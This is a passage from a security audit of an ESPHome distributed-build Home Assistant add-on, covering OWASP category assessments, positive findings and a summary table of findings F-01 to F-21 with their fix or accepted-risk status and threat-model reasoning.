| **A05 Security Misconfiguration** | OK (1.6.1+) | **F-13 FIXED (partial) in 1.6.1 via SS.4** — worker Dockerfile + server `ARG BUILD_FROM` default pinned to `python:3.13-slim@sha256:…`; Supervisor-driven server path still can't carry a digest. **F-20 CLOSED in 1.3.1 via `security_headers_middleware`** (CSP, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, X-Frame-Options on every `/ui/api/*` + static response). **F-21 FIXED in 1.6.1 via SS.1** — AppArmor profile attached, Supervisor runs the add-on confined instead of unconfined. Not audited: whether containers run as root (likely yes — neither Dockerfile sets `USER`). |
| **A06 Vulnerable & Outdated Components** | Largely OK (1.3.1+) | **F-12 CLOSED:** hash-pinned lockfiles + `--require-hashes` install + `pip-audit` in CI + `npm audit` in CI + Dependabot weekly PRs (pip × 2, npm, docker × 2, github-actions) + PY-7 (CVE applicability assessment) + PY-8 (lockfile sync) invariants. **F-18 WONTFIX (1.6.1)** — worker-time `esphome==<version>` install runs unpinned; accepted within the trusted-workers threat model. |
| **A07 Identification & Authentication Failures** | Accepted per threat model | Single static shared token with no rotation story (threat model §3 — workers are trusted). F-07 WONTFIX; sanity-limit mitigations from 1.3.x stay (log cap, parallel-jobs clamp, log-append DoS guard). |
| **A08 Software & Data Integrity Failures** | Partial | F-02 WONTFIX (workers trusted). **F-18 WONTFIX (1.6.1)** — worker pip install runs unpinned; SC.3 removed after 6 months of ~0% hit rate on the hardened path. F-19 FIXED (1.4.1 SC.1 — SHA-pinned Actions). Cosign-signed GHCR images + SBOM attestations (1.4.1 SC.2). |
| **A09 Security Logging & Monitoring Failures** | Partial | **Auth middleware now emits structured 401 reasons with peer IP (1.3.1 bug #3 + C.2).** No audit log of who triggered compiles or edited configs; no alerting on repeated auth failures. Server logs sufficient for post-incident forensics |
| **A10 Server-Side Request Forgery (SSRF)** | Low | `device_poller.py` only contacts mDNS-discovered ESPHome devices on well-known ports; the editor fetches ESPHome's JSON schema from `schema.esphome.io` (moved into a dedicated `api/esphomeSchema.ts` module during the 1.3.1 UI-1 cleanup — no attacker-controlled URL reaches a server-side fetcher) |

**Highest-leverage fixes that remain** (ordered by ease × impact):

*No open findings as of 1.6.1.* Cycle deltas: **F-13** moved OPEN (effectively WONTFIX-by-infrastructure) → **FIXED (partial)** via SS.4 (digest-pinned worker base + server `ARG BUILD_FROM` default; Supervisor-driven server path remains blocked on upstream regex). **F-18** moved FIXED (partial) → **WONTFIX** after the SC.3 constraints-file defense was removed — see §F-18 and the 2026-04-20 refresh note above for the re-assessment. New **F-21** (unconfined add-on) was identified and **FIXED** same cycle via SS.1 (AppArmor profile). F-14 / F-15 shipped in 1.5.0-dev.77 via SA.2 / SA.1 respectively. The remaining accepted-by-threat-model findings (F-01 / F-02 / F-04 / F-05 / F-06 / F-07 / F-08 / F-11 / F-16 / F-17 / F-18) are documentation of intentional trust boundaries, not backlog.

---

## Positive Findings

The following aspects of the implementation are done well and worth noting explicitly.

**Token generation with `secrets.token_hex`:** `app_config.py` uses `secrets.token_hex(16)` to generate the auth token when none is configured. This is cryptographically strong and correct.

**Atomic file writes for persistence:** Both `job_queue.py` (`_persist`) and `device_poller.py` (`_save_cache`) write to a `.tmp` file and atomically rename it to the final path. This prevents partial writes from corrupting the persisted state.

**Path traversal protection on file endpoints:** `ui_api.py` correctly uses `Path.resolve()` + `relative_to()` to guard the config file read and write endpoints against directory traversal attacks. The check is in the right place and uses the right primitive.

**Log endpoint uses `textContent`, not `innerHTML`:** The log modal in `static/index.html` line 1050 assigns build log content via `textContent`, which is safe against XSS. All other user-supplied strings are passed through `escapeHtml()` before being placed in innerHTML.

**Deduplication prevents queue flooding per-target:** `JobQueue.enqueue` refuses to add a second active job for the same target, preventing trivial queue amplification via repeated compile requests for the same device.

**ESPHome YAML resolution uses ESPHome's own pipeline:** `scanner.py` uses ESPHome's internal `load_yaml` + `do_packages_pass` + `do_substitution_pass` chain rather than a hand-rolled YAML parser. This means `!include`, `packages:`, and `${substitutions}` are all handled consistently with ESPHome's own behavior, reducing divergence bugs.

**Worker path validation on auto-update:** `client/client.py` line 509 checks that the target path's parent matches the worker directory before writing update files, preventing the server from writing to arbitrary locations via path injection in the filename.

**Heartbeat-based liveness detection:** The registry uses a configurable `worker_offline_threshold` to determine worker online status rather than a hard-coded magic number, and it is applied consistently in both the API and the UI.

**`tarfile.extractall` uses `filter="data"`:** `client/client.py` line 468 passes `filter="data"` to `extractall`, which is the Python 3.12 recommended way to prevent tar extraction from setting dangerous file permissions or overwriting absolute paths. This is a correct and modern usage.

---

## Summary Table

Status legend: **FIXED** (resolved, release noted) · **PARTIAL** (partially mitigated in the release noted; residual risk remains) · **OPEN** (still live, planned to fix) · **WONTFIX** (accepted risk by design for the HA add-on threat model) · **INFO** (observation, no action planned).

Status as of 1.7.0 (last reviewed 2026-05-02).

| ID   | Finding                                              | Severity | Status | Notes |
|------|------------------------------------------------------|----------|--------|-------|
| F-01 | Auth token exposed to browser via server-info API    | High     | WONTFIX | Threat model §1: browser is trusted. Required for the Connect Worker modal's `docker run` command UX. |
| F-02 | Worker auto-update executes arbitrary server code    | High     | WONTFIX | Threat model §3: every connected worker is trusted (shared bearer token = full fleet compromise either way). 1.3.0 LIB.0/LIB.1 image-version gating stays. Feature reverted + restored as bug #58; no further remediation planned. |
| F-03 | UI API unauthenticated if port 8765 is directly accessible | Medium | FIXED (1.5.0, mandatory `require_ha_auth`) | AU.1–AU.7. `auth_api: true` + HA Bearer validation via Supervisor `/auth` + add-on-token "system" Bearer path for the native HA integration. |
| F-04 | `secrets.yaml` included in every build bundle        | Medium   | WONTFIX | Threat model §3: workers are trusted. Required for ESPHome's `!secret` resolution on the worker. |
| F-05 | Worker-server communication is plaintext HTTP        | Medium   | WONTFIX | Threat model §2: LAN is trusted. Users with remote workers across segments can front the server with their own reverse proxy (documented). |
| F-06 | Supervisor IP bypass grants unauthenticated API access | Low    | WONTFIX | Threat model §4: Supervisor is trusted. Standard HA add-on pattern. 1.3.x hardening (`_normalize_peer_ip()`, structured 401 logging, `HA_SUPERVISOR_IP` constant) stays. |
| F-07 | No rate limiting or queue size cap                   | Low      | WONTFIX | Threat model §5: operator is trusted; home-fleet scale doesn't generate real queue pressure. 1.3.x partial mitigations (512 KB per-log cap, max_parallel_jobs clamp, 2 MB log-append guard) stay as sanity limits. |
| F-08 | Job results not validated against the claiming worker | Low     | WONTFIX | Threat model §3: workers are trusted. Firmware-upload endpoint does enforce `X-Client-Id == assigned_client_id` (bug #24 — data-loss race, not a security remediation). `submit_result`/`update_status` deliberately not extended. |
| F-09 | Path traversal check correct but worth hardening     | Low      | FIXED (1.3.0) | PY.1 introduced `helpers.safe_resolve()` and every UI API file endpoint now uses it. |
| F-10 | Monaco editor loaded from unpinned CDN (no SRI)      | Low      | FIXED (1.1.0) | React UI rewrite bundles `monaco-editor` + `@monaco-editor/react` via Vite (verified in `node_modules/monaco-editor/`). No external CDN. |
| F-11 | Build log content stored unredacted                  | Info     | NOT A FINDING | Logs contain values (WiFi passwords, OTA passwords, API keys) that the server itself distributed to the worker via `secrets.yaml` (F-04, accepted). Returning them to the server that already has them doesn't cross a trust boundary. Removed from residual-findings list. |
| F-12 | Dependency versions not pinned                       | Low      | FIXED (1.3.1) | Confirmed 2026-04-16: `ha-addon/{server,client}/requirements.lock` present, `--require-hashes` install, `pip-audit` + `npm audit` in CI, Dependabot weekly, PY-7 + PY-8 + PY-9 invariants enforced. |
| F-13 | Docker base image not pinned to a digest             | Low      | **FIXED (partial) — 1.6.1 (SS.4)** | Worker Dockerfile pins `python:3.13-slim@sha256:…` fully; server Dockerfile pins `ARG BUILD_FROM` default digest. Supervisor-driven server path via `build.yaml` still can't carry a digest (upstream `build_from` regex rejects `@sha256:…`); partial until upstream relaxes. |
| F-14 | Auth token file written without explicit permissions | Info     | **FIXED (1.5.0-dev.77)** | SA.2: `TOKEN_FILE.chmod(0o600)` immediately after `write_text`, wrapped in try/except so chmod failure on unusual filesystems logs at DEBUG rather than blocking startup. |
| F-15 | `X-Ingress-Path` injected into HTML unsanitized      | Info     | **FIXED (1.5.0-dev.77)** | SA.1: regex strips anything not in `[/A-Za-z0-9._-]` before interpolation; empty sanitized value falls through to default `<base href="./">`. |
| F-16 | Worker registry not persistent (operational note)    | Info     | INFO | By design — registry is in-memory. 1.6 **WC.1–WC.5** (durable `WORKER_NAME`) will make this less operationally painful. |
| F-17 | Unauth UI + `external_components` → worker RCE       | High     | WONTFIX | Threat model §3: workers are trusted. `external_components` / `includes` / `libraries` are core ESPHome features users rely on; refusing configs that use them would be a feature regression. F-03 flipped to mandatory in 1.5 (AU.7), so this is now "authenticated HA user can RCE workers" — accepted per threat model. |
| F-18 | Worker pip install is not hash-pinned                | High     | **WONTFIX — 1.6.1** (re-assessed) | SC.3 shipped in 1.5.0 as a partial fix (committed `esphome-constraints/<version>.txt`, weekly regen workflow) but was removed in 1.6.1 after 6 months showed the defense was net-zero: the single committed version rarely matched the version a worker actually installed (~0% hit rate), so the documented "unpinned fallback + WARNING" path was load-bearing. Workers already trusted for `external_components`/`includes`/`libraries:` Python execution (F-02/F-04/F-17 WONTFIX), so pinning just the ESPHome wheel was security theater. `version_manager._install()` simplified back to plain `pip install esphome==<version>`. |
| F-19 | GitHub Actions referenced by floating tags           | Low      | FIXED (1.4.1, SC.1) | Every non-local `uses:` across the 4 workflow files now pins a 40-char commit SHA with trailing `# vN.M.P` comment. `check-invariants.sh` rule + Dependabot watching. |
| F-20 | Missing security response headers on UI              | Low      | FIXED (1.3.1) | `security_headers_middleware` attaches CSP, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, `X-Frame-Options` on `/ui/api/*` + static. Tests in `test_security_headers.py`. |
| F-21 | Add-on ran unconfined (no AppArmor profile)          | Low      | **FIXED — 1.6.1 (SS.1)** | `ha-addon/apparmor.txt` ships + `apparmor: true` in config.yaml. Profile is attached as `esphome_dist_server` (Supervisor-renamed to `local_esphome_dist_server`). First-pass is deliberately permissive (explicit capability/file/network/etc. allows) — tightening tracked against observed denial telemetry. Security-star card flips. |
